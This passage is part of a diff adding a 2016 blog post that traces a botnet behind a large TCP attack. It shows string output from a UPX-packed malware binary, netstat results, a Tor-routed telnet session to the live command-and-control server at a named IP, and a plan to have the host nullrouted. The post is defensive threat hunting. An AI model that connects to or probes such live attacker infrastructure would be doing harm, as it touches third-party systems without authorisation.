+/E/t%
+Hp!&gt;
+,; u
+XBp/
+D.c7
+A(`g
+.c?C
+-!^s)?
+cjow
+8?:h
+?x,/&lt;
+4'O&gt;-/"
+_)^R
+UCo/OV
+%j7j
+dO/o
+R_o1
+\%EwY_1
+`/v]@
+9g(\
+-!Fj
+?5oZ
+ZVuo5
+."`?o7
+ewh/
+48/OI
+Yq0*
+xY}'_Mo'
+r9?]
+lXaV
+?/7;
+A&lt;oO
+&gt;/XV&lt;
+7XGw
+`0/&gt;_
+om u
+hb?!
+'oP@
+%o?@
+bT1_w
+B?Iw
+oBoB
+h _CO
+Co?g
+wh//_!
+Eo&amp;+v./
+-?~E
+hFOO
+FD|D2
+,+N8Go
+m7 ?
+O/Jo9J
+?
+ K}
+a___
+Ko,;S,
+ mXF
+/ ibc/sysdeps/
+              nux/i386/c
+rti.S
+stuff.
+__CTOR_L
+DEH_FRAM
+E_BEGIN
+-1pleted.2429
+w"do_global
+ject!8
+ummy
+}END~
+     z
+entF
+QU.;
+r&amp;tchar
+p2_pid
+rrno
+Mthread_sel
+manag
+[sm{
+ld#n
+_.Mm
+Jvent
+ftk.c
+g7sJc
+)ock
+Yld[
+u*ph
+queu
++4|#
+_ownTt
+Osus
+/[B0
+&amp;_R
+Rbug%
+fl%on
+uizeO}
+_mpDple
+dvar
+@lLqt
+on3%
+(Woc
+keys
+    k&lt;b
+?p=L
+f=nn
++a`_
+uler
+y9lz
+y
+ _b
+C4160
+4370
+.c
+  )
+1"nge
+pylenn
+w:/C
+)(Bs!
+tc9pl
+F00=
+e73me
+Hwnd
+boroms
+
+-PJv_r(#vy
+tcU0
+MhO\
+RP+VARS
+.5915
+X__q
+bresC
+n
+ _WRITE
+-IEi
+=fmt
+p10_
+xPis
+#a-l
+48&gt;b
+-ScX
+h~isv
+u"uZ
+"87+
+bytes
+l-sup
+_Srf
+pd&gt;v
+4051o
+r.
+  7
+n4FH
+]S85#p
+a6dgtcW
+w&amp;k0
+s)v&lt;
+SEAD
+rf0v
+n3\0
+L%,#
+GLOBAL_OFFSET_TABLE_:
+                     [
+E0`$(
+qsD."GI
+lH0l^
+Lina
+
+&amp;k/X@
+KcA,
+!G$#b~
+(!m8%
+9b%T
+8h]Bs#
+vcgd0[
+EIxpT
+v,bs
++bos)
+#ipe
+IP. a{
+HXLo
+pu%yE
+etx+-
+7!d0
+ypUH
+xfC\
+Host
+xStr
+^FMh
+BN'CR
+a68C__&lt;
+\o+a
+CeLH
+unAa
+9post
+d eP
+ab`p
+ 0O=
+#:ed
+
+K:"
+2ain
+H-0X
+G_2@l_0
+viKn
+tPa.5
+UCB
+
+aPdY
+~?UJV
+s[GI
+xfor&gt;
+0vfi
+P.cBuilg
+j\jI
+P|cast
+oErIP
+Ut4xb,)8cys
+z$%ki
+_\h@0V
+p~jn
+_VoR=#
+ofK!
+Y$`X
+ zpy
+XBp__m
+2f2t
+SPT}Ldz
+Aadd
++^n%
+8)XB$
+
+,ST*hdr
+mSOI$
+bX)f
+seBpid
+[CmQ
+
+tber
+&lt;OYF
+aOFork
+F
+ R^
+wait
+astF
+ader
+w,ljtDP0pt
+"LD0
+!mtxg
+ffcX
+$,`int
+JB
+  v
+KPerrq
+@$;to
+cdPidb
+v"$@IJ34&amp;QI
+ntr-
+,~oll
+ d=numiO
+!YQ~
+B
+ #H0
+&gt;brk
+V1a-
+JUNK
+Eicat
+iAVF
+V0'C8HC
+l0-g
+a00zpid
+reat[,
+!9rl
+&amp;A0j
+epFs
+2en`
+_Jv_R_C
+jo-,bX
+&amp;,0-
+KZ!@
+! tHOLD
+ogos
+UPX!
+UPX!
+-:~ suedadam$</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Now normally you would read through the file and try and find a IP; however, we&#8217;ve seen this source before so we know just about where we can find the IP! I looked for "root" and the other login credentials and there it was! "*76.123.", I then went back to the attacking source IP we had access to and ran the following:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code># netstat | grep 76.123
+tcp        0      1 61.80.20.38:59332       176.123.7.193:http      LAST_ACK
+tcp        0      1 61.80.20.38:56903       176.123.7.193:http      LAST_ACK
+tcp        0     84 61.80.20.38:60119       176.123.7.193:http      ESTABLISHED
+tcp        0      1 61.80.20.38:57097       176.123.7.193:http      LAST_ACK
+tcp        0      1 61.80.20.38:51267       176.123.7.193:http      LAST_ACK
+tcp        0      0 61.80.20.38:60121       176.123.7.193:http      ESTABLISHED
+tcp        0      1 61.80.20.38:59091       176.123.7.193:http      LAST_ACK
+tcp        0      1 61.80.20.38:58436       176.123.7.193:http      LAST_ACK
+tcp        0     81 61.80.20.38:59687       176.123.7.193:http      ESTABLISHED
+tcp        0      1 61.80.20.38:57956       176.123.7.193:http      LAST_ACK
+tcp        0      0 61.80.20.38:37721       176.123.7.193:telnet    ESTABLISHED
+tcp        0      0 61.80.20.38:59147       176.123.7.193:telnet    CLOSE_WAIT
+tcp        0     81 61.80.20.38:57909       176.123.7.193:http      FIN_WAIT1
+tcp        0      0 61.80.20.38:59919       176.123.7.193:http      ESTABLISHED
+tcp        0      1 61.80.20.38:58604       176.123.7.193:http      LAST_ACK</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Well damn, we found the botnet right there!
+Let&#8217;s go ahead and check it out for ourselves to confirm!</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code>-:~ suedadam$ torify telnet 176.123.7.193
+18:22:18 libtorsocks(23688): The symbol res_send() was not found in any shared library. The error reported was: dlsym(RTLD_NEXT, res_send): symbol not found!
+18:22:18 libtorsocks(23688): The symbol res_querydomain() was not found in any shared library. The error reported was: dlsym(RTLD_NEXT, res_querydomain): symbol not found!
+18:22:18 libtorsocks(23689): The symbol res_send() was not found in any shared library. The error reported was: dlsym(RTLD_NEXT, res_send): symbol not found!
+18:22:18 libtorsocks(23689): The symbol res_querydomain() was not found in any shared library. The error reported was: dlsym(RTLD_NEXT, res_querydomain): symbol not found!
+18:22:18 libtorsocks(23687): The symbol res_send() was not found in any shared library. The error reported was: dlsym(RTLD_NEXT, res_send): symbol not found!
+18:22:18 libtorsocks(23687): The symbol res_querydomain() was not found in any shared library. The error reported was: dlsym(RTLD_NEXT, res_querydomain): symbol not found!
+Trying 176.123.7.193...
+Connected to 176-123-7-193.alexhost.md.
+Escape character is '^]'.
+!* SCANNER ON</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>As soon as we connected it was right there, asking for us to start scanning! We found the C&amp;C! :)</p>
+</div>
+<div class="paragraph">
+<p>Now we can check who it is hosted with!</p>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_find_the_host_and_stop_them">Find the host and stop them!</h5>
+<div class="paragraph">
+<p>First let&#8217;s check the IP&#8217;s announcement:</p>
+</div>
+<div class="paragraph">
+<p><a href="http://bgp.he.net/ip/176.123.7.193" class="bare">http://bgp.he.net/ip/176.123.7.193</a></p>
+</div>
+<div class="paragraph">
+<p>We see a /24 announcement from AS15836, but what is this? The domain that the abuse email is pointed to is non-existant?  Whatever, we don&#8217;t need it, we can see by the rDNS that it belongs to alexhost.md
+<a href="https://alexhost.md/" class="bare">https://alexhost.md/</a></p>
+</div>
+<div class="paragraph">
+<p>We can see that they advertise DDoS protection:</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="https://i.imgur.com/oXD1gVh.png" alt="oXD1gVh.png">
+</div>
+</div>
+<div class="paragraph">
+<p>but wait, I remember someone advertising 500Gbps protection, Voxility! We can then see that they&#8217;re peered directly with Trabia who gets their DDoS protection from Voxility! (<a href="http://bgp.he.net/AS43289" class="bare">http://bgp.he.net/AS43289</a>) Let&#8217;s skip all the middle men and just jump to Voxility as we know that they&#8217;re a credible company, they&#8217;ll resolve this quickly for us ;) (Note that I left out that all traffic is being forced through Voxility rather than the other peers, if Voxility nullroutes it then we&#8217;ll be fine :) )</p>
+</div>
+<div class="paragraph">
+<p>So let&#8217;s do it! I sent an email to my good friend Maria from Voxility but they have to talk to their downstream before nullrouting it :( Hopefully they can expedite the process through their channels of communication!</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_this_botnet_is_currently_still_active_and_launching_attacks_it_is_hosted_on_ip_176_123_7_193">This botnet is currently still active and launching attacks, it is hosted on IP 176.123.7.193</h3>
+
+</div>
+        </section>
+
+        <footer class="post-footer">
+
+
+            <figure class="author-image">
+                <a class="img" href="" style="background-image: url(https://avatars.githubusercontent.com/u/3879307?v=3)"><span class="hidden">Adam Syed's Picture</span></a>
+            </figure>
+
+            <section class="author">
+                <h4><a href="">Adam Syed</a></h4>
+
+                    <p>Read <a href="">more posts</a> by this author.</p>
+                <div class="author-meta">
+                    <span class="author-location icon-location">California</span>
+                    <span class="author-link icon-link"><a href="http://dosattack.net/">http://dosattack.net/</a></span>
+                </div>
+            </section>
+
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="https://twitter.com/share?text=Large%20TCP%20attack%2C%20trace%20down%20the%20botnet!&amp;url=http://dosattack.net/2016/01/05/Large-TCP-attack-trace-down-the-botnet.html"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://dosattack.net/2016/01/05/Large-TCP-attack-trace-down-the-botnet.html"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://dosattack.net/2016/01/05/Large-TCP-attack-trace-down-the-botnet.html"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+        </footer>
+
+
+    </article>
+
+</main>
+
+
+
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="http://dosattack.net">Adam Syed</a> &copy; 2016</section>
+        <section class="poweredby">Proudly published with <a href="http://hubpress.io">HubPress</a></section>
+    </footer>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment-with-locales.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js?v="></script> 
+      <script type="text/javascript">
+        jQuery( document ).ready(function() {
+          // change date with ago
+          jQuery('ago.ago').each(function(){
+            var element = jQuery(this).parent();
+            element.html( moment(element.text()).fromNow());
+          });
+        });
+
+        hljs.initHighlightingOnLoad();      
+      </script>
+
+    <script type="text/javascript" src="//dosattack.net/themes/Casper/assets/js/jquery.fitvids.js?v=1.0.0"></script>
+    <script type="text/javascript" src="//dosattack.net/themes/Casper/assets/js/index.js?v=1.0.0"></script>
+
+</body>
+</html>
